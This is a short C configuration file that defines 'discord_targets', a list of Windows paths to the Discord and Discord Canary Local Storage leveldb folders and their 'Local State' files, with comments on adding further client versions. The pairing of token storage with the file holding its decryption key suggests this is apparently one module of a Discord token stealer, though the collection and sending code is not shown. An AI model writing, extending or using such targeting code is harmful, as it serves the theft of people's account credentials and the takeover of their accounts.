#include "main.h"
#include "config.h"

// Add new versions here (make sure to update num in targets)
const discord normal = {
	.discord_path =
		"C:\\Users\\%s\\AppData\\Roaming\\discord\\Local Storage\\leveldb",
	.discord_state_file =
		"C:\\Users\\%s\\AppData\\Roaming\\discord\\Local State"
};

const discord canary = {
	.discord_path = "C:\\Users\\%s\\AppData\\Roaming\\discordcanary\\Local "
			"Storage\\leveldb\\",
	.discord_state_file =
		"C:\\Users\\%s\\AppData\\Roaming\\discord\\Local State",
};

// add new versions to this array
const discord *versions[] = { &normal, &canary };
// update num to the number of versions!
const targets discord_targets = { .num = 2, .version = versions };
